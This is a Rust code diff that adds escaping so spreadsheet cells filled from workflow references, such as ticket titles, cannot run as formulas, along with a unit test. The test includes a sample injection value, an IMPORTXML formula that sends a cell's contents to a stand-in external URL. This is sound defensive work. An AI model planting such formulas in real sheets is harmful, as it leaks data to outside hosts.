@@ -142,6 +142,41 @@ pub fn rows_of(v: &Value) -> Result<Vec<Vec<String>>, String> {
     Ok(rows)
 }
 
+/// Whether a cell's text would be taken for a formula (or lose its leading quote) where a sheet reads what is typed:
+/// `=…`, `'…`, and `+…`, `-…` or `@…` that aren't plain numbers.
+fn reads_as_formula(v: &str) -> bool {
+    match v.chars().next() {
+        Some('=' | '\'') => true,
+        Some('+' | '-' | '@') => v.trim().parse::<f64>().is_err(),
+        _ => false,
+    }
+}
+
+/// Text that came into a sheet step's cells from references (`{{trigger.ticketTitle}}`), kept as text: a cell whose
+/// config holds a reference and whose value would read as a formula gets a leading `'`, which every sheet takes as
+/// "this is text" (a ticket title `=IMPORTXML(…)` must never run). Formulas written into the config itself still run.
+/// `raw` is the field as written (before references were filled in), `rows` what [`rows_of`] made of it filled in.
+pub fn text_from_refs(raw: &Value, rows: &mut [Vec<String>]) {
+    let from_ref = |r: usize, c: usize| -> bool {
+        let cell = match raw {
+            Value::Array(items) if items.iter().all(Value::is_array) => items.get(r).and_then(|row| row.get(c)),
+            Value::Array(cells) if r == 0 => cells.get(c),
+            Value::Array(_) => None,
+            // The whole field is a reference (or text holding one): every cell came from it.
+            Value::String(s) => return crate::workflow::refs::has_ref(s),
+            _ => None,
+        };
+        cell.and_then(Value::as_str).is_some_and(crate::workflow::refs::has_ref)
+    };
+    for (r, row) in rows.iter_mut().enumerate() {
+        for (c, v) in row.iter_mut().enumerate() {
+            if from_ref(r, c) && reads_as_formula(v) {
+                v.insert(0, '\'');
+            }
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -229,6 +264,25 @@ mod tests {
         assert_eq!(got, [("r1", "c1", true, true), ("c2", "c2", false, true)]);
         assert_eq!(new[0].quote.as_deref(), Some("Ship it"), "a reply carries its thread's quote");
         assert_eq!(comment_ids(&list[..1]), ["c1", "r1", "r2"]);
+    }
+
+    #[test]
+    fn text_from_references_never_runs_as_a_formula() {
+        let raw = json!([["{{trigger.ticketKey}}", "{{trigger.ticketTitle}}", "=SUM(1,2)", "{{trigger.pr}}"]]);
+        let mut rows =
+            vec![vec!["P-1".into(), "=IMPORTXML(\"https://x/\"&A1)".into(), "=SUM(1,2)".into(), "-12".into()]];
+        text_from_refs(&raw, &mut rows);
+        assert_eq!(rows[0], ["P-1", "'=IMPORTXML(\"https://x/\"&A1)", "=SUM(1,2)", "-12"], "the typed formula runs");
+        // One row of cells, a whole-field reference, and the other leading characters.
+        let mut one = vec![vec!["+A1".to_string(), "@x".into(), "'quoted".into(), "+5".into()]];
+        text_from_refs(&json!(["{{a}}", "{{b}}", "{{c}}", "{{d}}"]), &mut one);
+        assert_eq!(one[0], ["'+A1", "'@x", "''quoted", "+5"]);
+        let mut all = vec![vec!["=1+1".to_string()], vec!["ok".into()]];
+        text_from_refs(&json!("{{steps.rows.output}}"), &mut all);
+        assert_eq!(all, [vec!["'=1+1"], vec!["ok"]]);
+        let mut typed = vec![vec!["=A1*2".to_string()]];
+        text_from_refs(&json!([["=A1*2"]]), &mut typed);
+        assert_eq!(typed[0], ["=A1*2"]);
     }
 
     #[test]
